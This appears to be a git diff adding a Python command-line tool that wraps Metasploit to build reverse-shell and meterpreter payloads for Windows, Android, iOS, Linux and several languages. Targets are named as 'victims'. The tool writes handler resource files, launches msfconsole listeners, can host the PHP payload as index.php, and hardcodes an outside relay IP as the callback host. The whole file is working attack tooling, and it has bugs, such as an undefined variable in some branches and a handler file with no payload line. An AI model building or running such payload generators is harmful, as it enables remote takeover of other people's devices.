@@ -1,0 +1,1248 @@
+#!/bin/python3
+import os
+from time import sleep
+import socket
+ip_addresses = '127.0.0.1'
+ip_address = '127.0.0.1'
+os.system('clear')
+if not os.path.exists('data'):
+	os.system('mkdir data')
+if not os.path.exists('data/data.txt'):
+	os.system('touch data/data.txt')
+def ruby():
+	print('')
+	print('Enter the name of victim ...')
+	print('')
+	name = input('<<-- AI -->> : ')
+	if os.path.exists('data/' + name + '.rc'):
+		print('Sorry You can not set same name Enter different name to continue')
+		print('')
+		return ruby()
+	if not name:
+		print('')
+		print('Name is important please enter it to continue')
+		print('')
+		return ruby()
+	print('')
+	ip_addresses = ip_addresst()
+	if os.path.exists('php'):
+		if os.path.exists('/bin'):
+			print('Do You are using open vpn [y/n] ')
+			print('')
+			opet = input('<<-- AI -->> : ')
+			print('')
+			if opet == 'y' or opet == 'Y':
+				print('Enter the port number that is use in creating payload...')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return ruby()
+				print('')
+				print('Enter the port number that is use to lising')
+				print('')
+				port_lis = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return ruby()
+				print('')
+				ip_address = '193.161.193.99'
+			else:
+				print('Press enter to set it default ' + ip_addresses)
+				print('')
+				ip_address = input('<<-- AI -->> : ')
+				if not ip_address:
+					ip_address = ip_addresses
+				print('')
+				print('Enter the port ..')
+				print('')
+				print('Default is 4444')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					port_number = '4444'
+				port_lis = port_number
+	else:
+		print('Press enter to set it default ' + ip_addresses)
+		print('')
+		ip_address = input('<<-- AI -->> : ')
+		if not ip_address:
+			ip_address = ip_addresses
+		print('')
+		print('Enter the port ..')
+		print('')
+		print('Default is 4444')
+		print('')
+		port_number = input('<<-- AI -->> : ')
+		if not port_number:
+			port_number = '4444'
+		port_lis = port_number
+	print('')
+	print('Enter the output file name ....')
+	print('')
+	output_file_name = input('<<-- AI -->> : ')
+	if not output_file_name:
+		output_file_name = 'output.rb'
+	if not '.rb' in output_file_name:
+		output_file_name = output_file_name + '.rb'
+	print('')
+	print('Please Wait While creating payload ...')
+	print('')
+	os.system('msfvenom -p ruby/shell_reverse_tcp LHOST=' + ip_address + ' LPORT=' + port_number + ' -o ' + output_file_name)
+	os.system('clear')
+	print('')
+	if os.path.exists(output_file_name):
+		creat_lising_file(ip_address , port_lis , 'ruby' , name)
+		print('Done Your file is created > ' + output_file_name)
+		print('')
+		print('Press enter to go back ..')
+		input('')
+		main()
+	else:
+		print('Error Somthing Error has occur plese try agan')
+		exit()
+
+def linux():
+	print('')
+	print('Enter the name of victim ...')
+	print('')
+	name = input('<<-- AI -->> : ')
+	if os.path.exists('data/' + name + '.rc'):
+		print('Sorry You can not set same name Enter different name to continue')
+		print('')
+		return linux()
+	if not name:
+		print('')
+		print('Name is important please enter it to continue')
+		print('')
+		return linux()
+	print('')
+	ip_addresses = ip_addresst()
+	if os.path.exists('php'):
+		if os.path.exists('/bin'):
+			print('Do You are using open vpn [y/n] ')
+			print('')
+			opet = input('<<-- AI -->> : ')
+			print('')
+			if opet == 'y' or opet == 'Y':
+				print('Enter the port number that is use in creating payload...')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return linux()
+				print('')
+				print('Enter the port number that is use to lising')
+				print('')
+				port_lis = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return linux()
+				print('')
+				ip_address = '193.161.193.99'
+			else:
+				print('Press enter to set it default ' + ip_addresses)
+				print('')
+				ip_address = input('<<-- AI -->> : ')
+				if not ip_address:
+					ip_address = ip_addresses
+				print('')
+				print('Enter the port ..')
+				print('')
+				print('Default is 4444')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					port_number = '4444'
+				port_lis = port_number
+	else:
+		print('Press enter to set it default ' + ip_addresses)
+		print('')
+		ip_address = input('<<-- AI -->> : ')
+		if not ip_address:
+			ip_address = ip_addresses
+		print('')
+		print('Enter the port ..')
+		print('')
+		print('Default is 4444')
+		print('')
+		port_number = input('<<-- AI -->> : ')
+		if not port_number:
+			port_number = '4444'
+		port_lis = port_number
+	print('')
+	print('Enter the output file name ....')
+	print('')
+	output_file_name = input('<<-- AI -->> : ')
+	if not output_file_name:
+		output_file_name = 'output.sh'
+	if not '.sh' in output_file_name:
+		output_file_name = output_file_name + '.sh'
+	print('')
+	print('Please Wait While creating payload ...')
+	print('')
+	os.system('msfvenom -p linux/x86/shell/reverse_tcp LHOST=' + ip_address + ' LPORT=' + port_number + ' -o ' + output_file_name)
+	os.system('clear')
+	print('')
+	if os.path.exists(output_file_name):
+		creat_lising_file(ip_address , port_lis , 'linux' , name)
+		print('Done Your file is created > ' + output_file_name)
+		print('')
+		print('Press enter to go back ..')
+		input('')
+		main()
+	else:
+		print('Error Somthing Error has occur plese try agan')
+	exit()
+
+def php():
+	print('')
+	print('Enter the name of victim ...')
+	print('')
+	name = input('<<-- AI -->> : ')
+	if os.path.exists('data/' + name + '.rc'):
+		print('Sorry You can not set same name Enter different name to continue')
+		print('')
+		return php()
+	if not name:
+		print('')
+		print('Name is important please enter it to continue')
+		print('')
+		return php()
+	print('')
+	ip_addresses = ip_addresst()
+	if os.path.exists('php'):
+		if os.path.exists('/bin'):
+			print('Do You are using open vpn [y/n] ')
+			print('')
+			opet = input('<<-- AI -->> : ')
+			print('')
+			if opet == 'y' or opet == 'Y':
+				print('Enter the port number that is use in creating payload...')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return php()
+				print('')
+				print('Enter the port number that is use to lising')
+				print('')
+				port_lis = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return php()
+				print('')
+				ip_address = '193.161.193.99'
+			else:
+				print('Press enter to set it default ' + ip_addresses)
+				print('')
+				ip_address = input('<<-- AI -->> : ')
+				if not ip_address:
+					ip_address = ip_addresses
+				print('')
+				print('Enter the port ..')
+				print('')
+				print('Default is 4444')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					port_number = '4444'
+				port_lis = port_number
+	else:
+		print('Press enter to set it default ' + ip_addresses)
+		print('')
+		ip_address = input('<<-- AI -->> : ')
+		if not ip_address:
+			ip_address = ip_addresses
+		print('')
+		print('Enter the port ..')
+		print('')
+		print('Default is 4444')
+		print('')
+		port_number = input('<<-- AI -->> : ')
+		if not port_number:
+			port_number = '4444'
+		port_lis = port_number
+	print('')
+	output_file_name = 'index.php'
+	if not output_file_name:
+		output_file_name = 'output.php'
+	if not '.php' in output_file_name:
+		output_file_name = output_file_name + '.php'
+	print('')
+	print('Please Wait While creating payload ...')
+	print('')
+	os.system('msfvenom -p php/meterpreter/reverse_tcp LHOST=' + ip_address + ' LPORT=' + port_number + ' -o ' + output_file_name)
+	os.system('clear')
+	print('')
+	if os.path.exists(output_file_name):
+		creat_lising_file(ip_address , port_lis , 'php' , name)
+		print('Done Your file is created > ' + output_file_name)
+		print('')
+		print("Do You Wont to start ph server [y/n] ")
+		print('')
+		optionsu = input('<<-- AI -->> : ')
+		print('')
+		if optionsu == 'y' or optionsu == 'Y':
+			print('')
+			print('Please Wait starting php server ...')
+			print('')
+			print('Enter ip address for server ...')
+			print('')
+			ipo = input('<<-- AI -->> : ')
+			print('')
+			print('Enter the port for server ..')
+			print('')
+			porto = input('<<-- AI -->> : ')
+			print('')
+			print('Server is started in http//:' + ipo + ':' + porto)
+			print('')
+			os.system('php -S ' + ipo + ':' + porto)
+			print('')
+			print('Done ...')
+			print('')
+			print('Press enter to go back ..')
+			input('')
+			main()
+	else:
+		print('Error Somthing Error has occur plese try agan')
+	exit()
+
+
+
+
+def apple():
+	print('')
+	print('Enter the name of victim ...')
+	print('')
+	name = input('<<-- AI -->> : ')
+	if os.path.exists('data/' + name + '.rc'):
+		print('Sorry You can not set same name Enter different name to continue')
+		print('')
+		return apple()
+	if not name:
+		print('')
+		print('Name is important please enter it to continue')
+		print('')
+		return apple()
+	print('')
+	ip_addresses = ip_addresst()
+	if os.path.exists('php'):
+		if os.path.exists('/bin'):
+			print('Do You are using open vpn [y/n] ')
+			print('')
+			opet = input('<<-- AI -->> : ')
+			print('')
+			if opet == 'y' or opet == 'Y':
+				print('Enter the port number that is use in creating payload...')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return apple()
+				print('')
+				print('Enter the port number that is use to lising')
+				print('')
+				port_lis = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return apple()
+				print('')
+				ip_address = '193.161.193.99'
+			else:
+				print('Press enter to set it default ' + ip_addresses)
+				print('')
+				ip_address = input('<<-- AI -->> : ')
+				if not ip_address:
+					ip_address = ip_addresses
+				print('')
+				print('Enter the port ..')
+				print('')
+				print('Default is 4444')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					port_number = '4444'
+				port_lis = port_number
+	else:
+		print('Press enter to set it default ' + ip_addresses)
+		print('')
+		ip_address = input('<<-- AI -->> : ')
+		if not ip_address:
+			ip_address = ip_addresses
+		print('')
+		print('Enter the port ..')
+		print('')
+		print('Default is 4444')
+		print('')
+		port_number = input('<<-- AI -->> : ')
+		if not port_number:
+			port_number = '4444'
+		port_lis = port_number
+	print('')
+	print('Enter the output file name ....')
+	print('')
+	output_file_name = input('<<-- AI -->> : ')
+	if not output_file_name:
+		output_file_name = 'output.ios'
+	if not '.ios' in output_file_name:
+		output_file_name = output_file_name + '.ios'
+	print('')
+	print('Please Wait While creating payload ...')
+	print('')
+	os.system('msfvenom -p apple_ios/aarch64/shell_reverse_tcp LHOST=' + ip_address + ' LPORT=' + port_number + ' -o ' + output_file_name)
+	os.system('clear')
+	print('')
+	if os.path.exists(output_file_name):
+		creat_lising_file(ip_address , port_lis , 'apple' , name)
+		print('Done Your file is created > ' + output_file_name)
+		print('')
+		print('Press enter to go back ..')
+		input('')
+		main()
+	else:
+		print('Error Somthing Error has occur plese try agan')
+	exit()
+
+
+
+def nodejs():
+	print('')
+	print('Enter the name of victim ...')
+	print('')
+	name = input('<<-- AI -->> : ')
+	if os.path.exists('data/' + name + '.rc'):
+		print('Sorry You can not set same name Enter different name to continue')
+		print('')
+		return nodejs()
+	if not name:
+		print('')
+		print('Name is important please enter it to continue')
+		print('')
+		return nodejs()
+	print('')
+	ip_addresses = ip_addresst()
+	if os.path.exists('php'):
+		if os.path.exists('/bin'):
+			print('Do You are using open vpn [y/n] ')
+			print('')
+			opet = input('<<-- AI -->> : ')
+			print('')
+			if opet == 'y' or opet == 'Y':
+				print('Enter the port number that is use in creating payload...')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return nodejs()
+				print('')
+				print('Enter the port number that is use to lising')
+				print('')
+				port_lis = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return nodejs()
+				print('')
+				ip_address = '193.161.193.99'
+			else:
+				print('Press enter to set it default ' + ip_addresses)
+				print('')
+				ip_address = input('<<-- AI -->> : ')
+				if not ip_address:
+					ip_address = ip_addresses
+				print('')
+				print('Enter the port ..')
+				print('')
+				print('Default is 4444')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					port_number = '4444'
+				port_lis = port_number
+	else:
+		print('Press enter to set it default ' + ip_addresses)
+		print('')
+		ip_address = input('<<-- AI -->> : ')
+		if not ip_address:
+			ip_address = ip_addresses
+		print('')
+		print('Enter the port ..')
+		print('')
+		print('Default is 4444')
+		print('')
+		port_number = input('<<-- AI -->> : ')
+		if not port_number:
+			port_number = '4444'
+		port_lis = port_number
+	print('')
+	print('Enter the output file name ....')
+	print('')
+	output_file_name = input('<<-- AI -->> : ')
+	if not output_file_name:
+		output_file_name = 'output.js'
+	if not '.js' in output_file_name:
+		output_file_name = output_file_name + '.js'
+	print('')
+	print('Please Wait While creating payload ...')
+	print('')
+	os.system('msfvenom -p nodejs/shell_reverse_tcp LHOST=' + ip_address + ' LPORT=' + port_number + ' -o ' + output_file_name)
+	os.system('clear')
+	print('')
+	if os.path.exists(output_file_name):
+		creat_lising_file(ip_address , port_lis , 'nodejs' , name)
+		os.system('clear')
+		print('')
+		print('Done Your file is created > ' + output_file_name)
+		print('')
+		print('Press enter to go back ..')
+		input('')
+		main()
+	else:
+		print('Error Somthing Error has occur plese try agan')
+	exit()
+
+def java():
+	print('')
+	print('Enter the name of victim ...')
+	print('')
+	name = input('<<-- AI -->> : ')
+	if os.path.exists('data/' + name + '.rc'):
+		print('Sorry You can not set same name Enter different name to continue')
+		print('')
+		return java()
+	if not name:
+		print('')
+		print('Name is important please enter it to continue')
+		print('')
+		return java()
+	print('')
+	ip_addresses = ip_addresst()
+	if os.path.exists('php'):
+		if os.path.exists('/bin'):
+			print('Do You are using open vpn [y/n] ')
+			print('')
+			opet = input('<<-- AI -->> : ')
+			print('')
+			if opet == 'y' or opet == 'Y':
+				print('Enter the port number that is use in creating payload...')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return java()
+				print('')
+				print('Enter the port number that is use to lising')
+				print('')
+				port_lis = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return java()
+				print('')
+				ip_address = '193.161.193.99'
+			else:
+				print('Press enter to set it default ' + ip_addresses)
+				print('')
+				ip_address = input('<<-- AI -->> : ')
+				if not ip_address:
+					ip_address = ip_addresses
+				print('')
+				print('Enter the port ..')
+				print('')
+				print('Default is 4444')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					port_number = '4444'
+				port_lis = port_number
+	else:
+		print('Press enter to set it default ' + ip_addresses)
+		print('')
+		ip_address = input('<<-- AI -->> : ')
+		if not ip_address:
+			ip_address = ip_addresses
+		print('')
+		print('Enter the port ..')
+		print('')
+		print('Default is 4444')
+		print('')
+		port_number = input('<<-- AI -->> : ')
+		if not port_number:
+			port_number = '4444'
+		port_lis = port_number
+	print('')
+	print('Enter the output file name ....')
+	print('')
+	output_file_name = input('<<-- AI -->> : ')
+	if not output_file_name:
+		output_file_name = 'output.jar'
+	if not '.jar' in output_file_name:
+		output_file_name = output_file_name + '.jar'
+	print('')
+	print('Please Wait While creating payload ...')
+	print('')
+	os.system('msfvenom -p java/meterpreter/reverse_tcp LHOST=' + ip_address + ' LPORT=' + port_number + ' -o ' + output_file_name)
+	os.system('clear')
+	print('')
+	if os.path.exists(output_file_name):
+		creat_lising_file(ip_address , port_lis , 'java' , name)
+		print('Done Your file is created > ' + output_file_name)
+		print('')
+		print('Press enter to go back ..')
+		input('')
+		main()
+	else:
+		print('Error Somthing Error has occur plese try agan')
+	exit()
+
+
+
+
+def ip_addresst():
+	print('')
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	try:
+		s.connect(('10.255.255.255' , 1))
+		ip = s.getsockname()[0]
+	except:
+		ip = '127.0.0.1'
+	finally:
+		s.close()
+	return ip
+
+def list_users():
+	print('')
+	print("Please Wait Collectinng victime's name ")
+	os.system('clear')
+	os.system('ls data/*.rc > data/data.txt')
+	with open('data/data.txt' , 'r') as op:
+		victims_list = op.read()
+	if not victims_list:
+		os.system('clear')
+		print('')
+		print('Please Add A victime by this tool in Creat msf payload section')
+		print('After that you will be able to see Them ..')
+		print('')
+		exit()
+	victims_list = victims_list.replace('.rc' , '')
+	victims_list = victims_list.replace('data/' , '')
+	victims_list = victims_list.split('\n')
+	total = len(victims_list)
+	print('Press Enter to go back ...')
+	print('')
+	num = 0
+	while num < total - 1:
+		print( str(num + 1) + ' > ' + victims_list[num])
+		num = num + 1
+	print('')
+	input('')
+	main()
+
+def logo():
+	os.system('clear')
+	print('''
+         _____                    
+|       |      \                / 
+|       |       \              / 
+|       |__      \            / 
+|       |         \          / 
+|       |          \   /\   / 
+|______ |_____      \_/  \_/ 
+
+ Author > 5M4CK3R
+
+		''')
+def main():
+	try:
+		logo()
+		print('')
+		print('Chuse The Option From Given Below')
+		print('''
+
+1 > Creat msf payload
+
+2 > Start lising
+
+3 > Delete Victim
+
+4 > List Users
+
+5 > About
+
+6 > Exit
+
+			''')
+		options = int(input('<<-- AI -->> : '))
+		if options == 1:
+			os.system('clear')
+			creat_payload()
+		elif options == 2:
+			start_lisning()
+		elif options == 3:
+			delet_victim()
+		elif options == 4:
+			list_users()
+		elif options == 5:
+			os.system('clear')
+			print('This tool is created by 5M4CK3R this tool is for those person who use metasploit more then every and dont wont to type command agan and agan ')
+			print('')
+			exit()
+		elif options == 6:
+			print('')
+			print('Exit ..')
+			print('')
+			exit()
+		else:
+			print('Chuse The Right Option')
+			sleep(1)
+			return main()
+	except KeyboardInterrupt:
+		os.system('clear')
+		print('')
+		print('Exit ..')
+		print('')
+		exit()
+	except ValueError:
+		os.system('clear')
+		print('')
+		print('Exit ...')
+		print('')
+		exit()
+
+def delet_victim():
+	print('')
+	print('Please Enter the victime name ')
+	os.system('clear')
+	os.system('ls data/*.rc > data/data.txt')
+	with open('data/data.txt' , 'r') as op:
+		victims_list = op.read()
+	if not victims_list:
+		os.system('clear')
+		print('')
+		print('Please Add A victime by this tool in Creat msf payload section')
+		print('After that you will be able to delete it ..')
+		print('')
+		exit()
+	victims_list = victims_list.replace('.rc' , '')
+	victims_list = victims_list.replace('data/' , '')
+	victims_list = victims_list.split('\n')
+	total = len(victims_list)
+	print('Chuse Your Victime To Delete ...')
+	print('')
+	print('Type enter to go back ...')
+	print('')
+	num = 0
+	while num < total - 1:
+		print( str(num + 1) + ' > ' + victims_list[num])
+		num = num + 1
+	print('')
+	number = input('<<-- AI -->> : ')
+	if not number:
+		main()
+	number = int(number)
+	number = number - 1
+	print('')
+	file_name = victims_list[number] + '.rc'
+	print('')
+	print('Please While Deleting Victim')
+	print('')
+	os.system('rm -rf data/' + file_name)
+	print('Done Victim Deleted ..')
+	print('')
+	print('Do you wont to delete another [y/n] ')
+	print('')
+	datar = input('<<-- AI -->> : ')
+	if datar == 'y' or datar == 'Y':
+		return delet_victim()
+	else:
+		print('')
+		main()
+
+def start_lisning():
+	os.system('clear')
+	os.system('ls data/*.rc > data/data.txt')
+	with open('data/data.txt' , 'r') as op:
+		victims_list = op.read()
+	if not victims_list:
+		print('')
+		print('Please Add A victime by this tool in Creat msf payload section')
+		print('')
+		exit()
+	victims_list = victims_list.replace('.rc' , '')
+	victims_list = victims_list.replace('data/' , '')
+	victims_list = victims_list.split('\n')
+	total = len(victims_list)
+	print('Chuse Your Victime To Start Attack ...')
+	print('')
+	print('Type 0 to go back')
+	num = 0
+	while num < total - 1:
+		print('')
+		print( str(num + 1) + ' > ' + victims_list[num])
+		num = num + 1
+	print('')
+	number = int(input('<<-- AI -->> : '))
+	if number == 0:
+		main()
+	number = number - 1
+	print('')
+	print('Please Wait While Starting Lising ...')
+	print('')
+	file_name = victims_list[number] + '.rc'
+	os.system('msfconsole -r data/' + file_name)
+	print('Done')
+	print('')
+	exit()
+
+
+def creat_payload():
+	print('')
+	print('Chuse Option .')
+	print('''
+
+1 > Window
+
+2 > Android
+
+3 > Python
+
+4 > Ruby
+
+5 > Linux
+
+6 > PHP
+
+7 > Apple
+
+8 > Node js
+
+9 > Java
+
+10 > Back
+
+		''')
+	options = int(input('<<-- AI -->> : '))
+	if options == 1:
+		os.system('clear')
+		window()
+	elif options == 2:
+		os.system('clear')
+		android()
+	elif options == 3:
+		os.system('clear')
+		python()
+	elif options == 4:
+		os.system('clear')
+		ruby()
+	elif options == 5:
+		os.system('clear')
+		linux()
+	elif options == 6:
+		os.system('clear')
+		php()
+	elif options == 7:
+		os.system('clear')
+		apple()
+	elif options == 8:
+		os.system('clear')
+		nodejs()
+	elif options == 9:
+		os.system('clear')
+		java()
+	elif options == 10:
+		print('')
+		os.system('clear')
+		main()
+
+	else:
+		print('')
+		print('Enter The Valid option ...')
+
+def python():
+	print('')
+	print('Enter the name of victim ...')
+	print('')
+	name = input('<<-- AI -->> : ')
+	if os.path.exists('data/' + name + '.rc'):
+		print('Sorry You can not set same name Enter different name to continue')
+		print('')
+		return python()
+	if not name:
+		print('')
+		print('Name is important please enter it to continue')
+		print('')
+		return python()
+	print('')
+	ip_addresses = ip_addresst()
+	if os.path.exists('php'):
+		if os.path.exists('/bin'):
+			print('Do You are using open vpn [y/n] ')
+			print('')
+			opet = input('<<-- AI -->> : ')
+			print('')
+			if opet == 'y' or opet == 'Y':
+				print('Enter the port number that is use in creating payload...')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return python()
+				print('')
+				print('Enter the port number that is use to lising')
+				print('')
+				port_lis = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return python()
+				print('')
+				ip_address = '193.161.193.99'
+			else:
+				print('Press enter to set it default ' + ip_addresses)
+				print('')
+				ip_address = input('<<-- AI -->> : ')
+				if not ip_address:
+					ip_address = ip_addresses
+				print('')
+				print('Enter the port ..')
+				print('')
+				print('Default is 4444')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					port_number = '4444'
+				port_lis = port_number
+	else:
+		print('Press enter to set it default ' + ip_addresses)
+		print('')
+		ip_address = input('<<-- AI -->> : ')
+		if not ip_address:
+			ip_address = ip_addresses
+		print('')
+		print('Enter the port ..')
+		print('')
+		print('Default is 4444')
+		print('')
+		port_number = input('<<-- AI -->> : ')
+		if not port_number:
+			port_number = '4444'
+		port_lis = port_number
+	print('')
+	print('Enter the output file name ....')
+	print('')
+	output_file_name = input('<<-- AI -->> : ')
+	if not output_file_name:
+		output_file_name = 'output.py'
+	if not '.py' in output_file_name:
+		output_file_name = output_file_name + '.py'
+	print('')
+	print('Please Wait While creating payload ...')
+	print('')
+	os.system('msfvenom -p python/meterpreter/reverse_tcp LHOST=' + ip_address + ' LPORT=' + port_number + ' -o ' + output_file_name)
+	os.system('clear')
+	print('')
+	if os.path.exists(output_file_name):
+		creat_lising_file(ip_address , port_lis , 'python' , name)
+		print('Done Your file is created > ' + output_file_name)
+		print('')
+		print('Press enter to go back ..')
+		input('')
+		main()
+	else:
+		print('Error Somthing Error has occur plese try agan')
+	exit()
+
+
+def android():
+	print('')
+	print('Enter the name of victim ...')
+	print('')
+	name = input('<<-- AI -->> : ')
+	if os.path.exists('data/' + name + '.rc'):
+		print('Sorry You can not set same name Enter different name to continue')
+		print('')
+		return android()
+	if not name:
+		print('')
+		print('Name is important please enter it to continue')
+		print('')
+		return android()
+	print('')
+	
+	if os.path.exists('/bin/python3'):
+		if os.path.exists('/bin'):
+			print('Do You are using open vpn [y/n] ')
+			print('')
+			opet = input('<<-- AI -->> : ')
+			print('')
+			if opet == 'y' or opet == 'Y':
+				print('Enter the port number that is use in creating payload...')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return android()
+				print('')
+				print('Enter the port number that is use to lising')
+				print('')
+				port_lis = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return android()
+				print('')
+				ip_address = '193.161.193.99'
+			else:
+				print('Press enter to set it default ' + ip_addresses)
+				print('')
+				ip_address = input('<<-- AI -->> : ')
+				if not ip_address:
+					ip_address = ip_addresses
+				print('')
+				print('Enter the port ..')
+				print('')
+				print('Default is 4444')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					port_number = '4444'
+				port_lis = port_number
+	else:
+		print('')
+		print('Press enter to set it default ' + ip_addresses)
+		print('')
+		ip_address = input('<<-- AI -->> : ')
+		if not ip_address:
+			ip_address = ip_addresses
+		print('')
+		print('Enter the port ..')
+		print('')
+		print('Default is 4444')
+		print('')
+		port_number = input('<<-- AI -->> : ')
+		if not port_number:
+			port_number = '4444'
+		port_lis = port_number
+	print('')
+	print('Enter the output file name ....')
+	print('')
+	output_file_name = input('<<-- AI -->> : ')
+	if not output_file_name:
+		output_file_name = 'output.apk'
+	if not '.apk' in output_file_name:
+		output_file_name = output_file_name + '.apk'
+	print('')
+	print('Please Wait While creating payload ...')
+	print('')
+	os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST=' + ip_address + ' LPORT=' + port_number + ' -o ' + output_file_name)
+	os.system('clear')
+	print('')
+	if os.path.exists(output_file_name):
+		creat_lising_file(ip_address , port_lis , 'android' , name)
+		print('Done Your file is created > ' + output_file_name)
+		print('')
+		print('Press enter to go back ..')
+		input('')
+		main()
+	else:
+		print('Error Somthing Error has occur plese try agan')
+	exit()
+
+def window():
+	print('')
+	print('Enter the name of victim ...')
+	print('')
+	name = input('<<-- AI -->> : ')
+	if os.path.exists('data/' + name + '.rc'):
+		print('Sorry You can not set same name Enter different name to continue')
+		print('')
+		return window()
+	if not name:
+		print('')
+		print('Name is important please enter it to continue')
+		print('')
+		return window()
+	print('')
+	
+	if os.path.exists('/bin/python3'):
+		if os.path.exists('/bin'):
+			print('Do You are using open vpn [y/n] ')
+			print('')
+			opet = input('<<-- AI -->> : ')
+			print('')
+			if opet == 'y' or opet == 'Y':
+				print('Enter the port number that is use in creating payload...')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return window()
+				print('')
+				print('Enter the port number that is use to lising')
+				print('')
+				port_lis = input('<<-- AI -->> : ')
+				if not port_number:
+					print('')
+					print('Port is reqired try agan...')
+					print('')
+					return window()
+				print('')
+				ip_address = '193.161.193.99'
+			else:
+				print('Press enter to set it default ' + ip_addresses)
+				print('')
+				ip_address = input('<<-- AI -->> : ')
+				if not ip_address:
+					ip_address = ip_addresses
+				print('')
+				print('Enter the port ..')
+				print('')
+				print('Default is 4444')
+				print('')
+				port_number = input('<<-- AI -->> : ')
+				if not port_number:
+					port_number = '4444'
+				port_lis = port_number
+	else:
+		print('')
+		print('Press enter to set it default ' + ip_addresses)
+		print('')
+		ip_address = input('<<-- AI -->> : ')
+		if not ip_address:
+			ip_address = ip_addresses
+		print('')
+		print('Enter the port ..')
+		print('')
+		print('Default is 4444')
+		print('')
+		port_number = input('<<-- AI -->> : ')
+		if not port_number:
+			port_number = '4444'
+		port_lis = port_number
+	print('')
+	print('Enter the output file name ....')
+	print('')
+	output_file_name = input('<<-- AI -->> : ')
+	if not output_file_name:
+		output_file_name = 'output.exe'
+	if not '.exe' in output_file_name:
+		output_file_name = output_file_name + '.exe'
+	print('')
+	print('Please Wait While creating payload ...')
+	print('')
+	os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + ip_address + ' LPORT=' + port_number + ' -o ' + output_file_name)
+	os.system('clear')
+	print('')
+	if os.path.exists(output_file_name):
+		creat_lising_file(ip_address , port_lis , 'window' , name)
+		print('Done Your file is created > ' + output_file_name)
+		print('')
+		print('Press enter to go back ..')
+		input('')
+		main()
+	else:
+		print('Error Somthing Error has occur plese try agan')
+	exit()
+
+def creat_lising_file(ip , port , meterpreter , name):
+	os.system('touch data/' + name + '.rc')
+	if meterpreter == 'window':
+		with open('data/' + name + '.rc' , 'w') as op:
+			op.write('use exploit/multi/handler\n')
+			op.write('set payload windows/meterpreter/reverse_tcp\n')
+			op.write('set LHOST ' + ip + '\n')
+			op.write('set LPORT ' + port + '\n')
+			op.write('exploit')
+	elif meterpreter == 'android':
+		with open('data/' + name + '.rc' , 'w') as op:
+			op.write('use exploit/multi/handler\n')
+			op.write('set payload android/meterpreter/reverse_tcp\n')
+			op.write('set LHOST ' + ip + '\n')
+			op.write('set LPORT ' + port + '\n')
+			op.write('exploit')
+	elif meterpreter == 'java':
+		with open('data/' + name + '.rc' , 'w') as op:
+			op.write('use exploit/multi/handler\n')
+			op.write('set payload java/meterpreter/reverse_tcp\n')
+			op.write('set LHOST ' + ip + '\n')
+			op.write('set LPORT ' + port + '\n')
+			op.write('exploit')
+	elif meterpreter == 'php':
+		with open('data/' + name + '.rc' , 'w') as op:
+			op.write('use exploit/multi/handler\n')
+			op.write('set payload php/meterpreter/reverse_tcp\n')
+			op.write('set LHOST ' + ip + '\n')
+			op.write('set LPORT ' + port + '\n')
+			op.write('exploit')
+	elif meterpreter == 'python':
+		with open('data/' + name + '.rc' , 'w') as op:
+			op.write('use exploit/multi/handler\n')
+			op.write('set payload python/meterpreter/reverse_tcp\n')
+			op.write('set LHOST ' + ip + '\n')
+			op.write('set LPORT ' + port + '\n')
+			op.write('exploit')
+	elif meterpreter == 'apple':
+		with open('data/' + name + '.rc' , 'w') as op:
+			op.write('use exploit/multi/handler\n')
+			op.write('set payload apple_ios/aarch64/shell_reverse_tcp\n')
+			op.write('set LHOST ' + ip + '\n')
+			op.write('set LPORT ' + port + '\n')
+			op.write('exploit')
+	elif meterpreter == 'nodejs':
+		with open('data/' + name + '.rc' , 'w') as op:
+			op.write('use exploit/multi/handler\n')
+			op.write('nodejs/shell_reverse_tcp\n')
+			op.write('set LHOST ' + ip + '\n')
+			op.write('set LPORT ' + port + '\n')
+			op.write('exploit')
+	elif meterpreter == 'ruby':
+		with open('data/' + name + '.rc' , 'w') as op:
+			op.write('use exploit/multi/handler\n')
+			op.write('set payload ruby/shell_reverse_tcp\n')
